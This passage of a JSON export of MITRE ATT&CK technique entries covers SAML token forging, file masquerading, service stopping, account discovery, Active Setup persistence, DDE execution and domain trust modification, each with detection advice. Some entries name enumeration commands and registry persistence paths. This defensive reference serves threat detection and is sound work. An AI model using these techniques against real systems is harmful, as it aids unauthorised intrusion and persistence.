      "url": "https://attack.mitre.org/techniques/T1606.002",
      "stix_id": "attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2",
      "created": "2020-12-17T15:24:12.240000+00:00",
      "modified": "2025-04-15T23:01:25.698000+00:00",
      "platforms": [
        "SaaS",
        "Windows",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Web Credential: Web Credential Usage",
        "Web Credential: Web Credential Creation",
        "Logon Session: Logon Session Creation",
        "User Account: User Account Authentication",
        "Logon Session: Logon Session Metadata",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)\n\nConsider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)"
    },
    "T1036.008": {
      "id": "T1036.008",
      "name": "Masquerade File Type",
      "description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.008",
      "stix_id": "attack-pattern--208884f1-7b83-4473-ac22-4e1cf6c41471",
      "created": "2023-03-08T22:40:06.918000+00:00",
      "modified": "2025-04-15T19:58:12.855000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Modification",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1489": {
      "id": "T1489",
      "name": "Service Stop",
      "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
      "tactic": "impact",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1489",
      "stix_id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b",
      "created": "2019-03-29T19:00:55.901000+00:00",
      "modified": "2025-04-15T19:58:12.942000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: Process Termination",
        "Windows Registry: Windows Registry Key Modification",
        "Command: Command Execution",
        "File: File Modification",
        "Process: OS API Execution",
        "Service: Service Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\n\nMonitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.\n\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting.(Citation: Talos Olympic Destroyer 2018)"
    },
    "T1587.001": {
      "id": "T1587.001",
      "name": "Malware",
      "description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1587.001",
      "stix_id": "attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0",
      "created": "2020-10-01T01:33:01.433000+00:00",
      "modified": "2025-04-15T22:47:44.654000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Malware Repository: Malware Content",
        "Malware Repository: Malware Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle."
    },
    "T1652": {
      "id": "T1652",
      "name": "Device Driver Discovery",
      "description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1652",
      "stix_id": "attack-pattern--215d9700-5881-48b8-8265-6449dbb7195d",
      "created": "2023-03-28T20:14:49.087000+00:00",
      "modified": "2025-04-15T22:17:22.391000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Process: Process Creation",
        "Process: OS API Execution",
        "Windows Registry: Windows Registry Key Access"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1087.002": {
      "id": "T1087.002",
      "name": "Domain Account",
      "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)  ",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1087.002",
      "stix_id": "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af",
      "created": "2020-02-21T21:08:26.480000+00:00",
      "modified": "2025-04-15T22:21:07.252000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Command: Command Execution",
        "Process: OS API Execution",
        "Network Traffic: Network Traffic Content",
        "Group: Group Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n"
    },
    "T1547.014": {
      "id": "T1547.014",
      "name": "Active Setup",
      "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.014",
      "stix_id": "attack-pattern--22522668-ddf6-470b-a027-9d6866679f67",
      "created": "2020-12-18T16:33:13.098000+00:00",
      "modified": "2025-04-15T19:58:13.464000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Windows Registry: Windows Registry Key Creation",
        "Process: Process Creation",
        "Windows Registry: Windows Registry Key Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data."
    },
    "T1564": {
      "id": "T1564",
      "name": "Hide Artifacts",
      "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1564",
      "stix_id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
      "created": "2020-02-26T17:41:25.933000+00:00",
      "modified": "2025-04-15T21:39:52.216000+00:00",
      "platforms": [
        "Linux",
        "Office Suite",
        "Windows",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata",
        "Application Log: Application Log Content",
        "Process: Process Creation",
        "Command: Command Execution",
        "File: File Modification",
        "Firmware: Firmware Modification",
        "Service: Service Creation",
        "Windows Registry: Windows Registry Key Modification",
        "Script: Script Execution",
        "User Account: User Account Creation",
        "Process: OS API Execution",
        "User Account: User Account Metadata",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage."
    },
    "T1559.002": {
      "id": "T1559.002",
      "name": "Dynamic Data Exchange",
      "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1559.002",
      "stix_id": "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d",
      "created": "2020-02-12T14:10:50.699000+00:00",
      "modified": "2025-04-16T20:37:15.927000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Module: Module Load",
        "Script: Script Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE, Office Open XML, CSV, and other files can be scanned for \u2018DDEAUTO', \u2018DDE\u2019, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )"
    },
    "T1204.002": {
      "id": "T1204.002",
      "name": "Malicious File",
      "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1204.002",
      "stix_id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
      "created": "2020-03-11T14:49:36.954000+00:00",
      "modified": "2025-04-15T19:58:13.883000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe)."
    },
    "T1591.003": {
      "id": "T1591.003",
      "name": "Identify Business Tempo",
      "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1591.003",
      "stix_id": "attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f",
      "created": "2020-10-02T16:34:32.435000+00:00",
      "modified": "2025-04-15T22:40:43.647000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1071.005": {
      "id": "T1071.005",
      "name": "Publish/Subscribe Protocols",
      "description": "Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>, and <code>STOMP</code> use a publish/subscribe design, with message distribution managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation: Mandiant APT1 Appendix) Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics.(Citation: wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1071.005",
      "stix_id": "attack-pattern--241f9ea8-f6ae-4f38-92f5-cef5b7e539dd",
      "created": "2024-08-28T14:14:18.512000+00:00",
      "modified": "2025-04-15T19:58:14.152000+00:00",
      "platforms": [
        "macOS",
        "Linux",
        "Windows",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1592.001": {
      "id": "T1592.001",
      "name": "Hardware",
      "description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1592.001",
      "stix_id": "attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26",
      "created": "2020-10-02T16:40:47.488000+00:00",
      "modified": "2025-04-15T22:39:29.396000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": "Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1080": {
      "id": "T1080",
      "name": "Taint Shared Content",
      "description": "\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
      "tactic": "lateral-movement",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1080",
      "stix_id": "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c",
      "created": "2017-05-31T21:31:01.759000+00:00",
      "modified": "2025-04-15T19:58:14.334000+00:00",
      "platforms": [
        "Windows",
        "SaaS",
        "Linux",
        "macOS",
        "Office Suite"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Share: Network Share Access",
        "Process: Process Creation",
        "File: File Modification",
        "File: File Creation"
      ],
      "defense_bypassed": [],
      "detection": "Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.\n\nFrequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content."
    },
    "T1484.002": {
      "id": "T1484.002",
      "name": "Trust Modification",
      "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1484.002",
      "stix_id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
      "created": "2020-12-28T21:59:02.181000+00:00",
      "modified": "2025-04-15T19:58:14.422000+00:00",
      "platforms": [
        "Windows",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "Application Log: Application Log Content",
        "Active Directory: Active Directory Object Modification",
        "Active Directory: Active Directory Object Creation"
      ],
      "defense_bypassed": [],
      "detection": "Monitor for modifications to domain trust settings, such as when a user or application modifies the federation settings on the domain or updates domain authentication from Managed to Federated via ActionTypes <code>Set federation settings on domain</code> and <code>Set domain authentication</code>.(Citation: Microsoft - Azure Sentinel ADFSDomainTrustMods) This may also include monitoring for Event ID 307 which can be correlated to relevant Event ID 510 with the same Instance ID for change details.(Citation: Sygnia Golden SAML)(Citation: CISA SolarWinds Cloud Detection)\n\nMonitor for PowerShell commands such as: <code>Update-MSOLFederatedDomain \u2013DomainName: \"Federated Domain Name\"</code>, or <code>Update-MSOLFederatedDomain \u2013DomainName: \"Federated Domain Name\" \u2013supportmultipledomain</code>.(Citation: Microsoft - Update or Repair Federated domain)"
    },
    "T1573.001": {
      "id": "T1573.001",
      "name": "Symmetric Cryptography",
      "description": "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "tactic": "command-and-control",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1573.001",
      "stix_id": "attack-pattern--24bfaeba-cb0d-4525-b3dc-507c77ecec41",
      "created": "2020-03-16T15:45:17.032000+00:00",
      "modified": "2025-04-15T19:58:14.636000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Content"
      ],
      "defense_bypassed": [],
      "detection": "With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)"
    },
    "T1087.001": {
      "id": "T1087.001",
      "name": "Local Account",
      "description": "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code> on macOS and Linux can list local users and groups.(Citation: Mandiant APT1)(Citation: id man page)(Citation: groups man page) On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS, the <code>dscl . list /Users</code> command can be used to enumerate local accounts. On ESXi servers, the `esxcli system account list` command can list local user accounts.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1087.001",
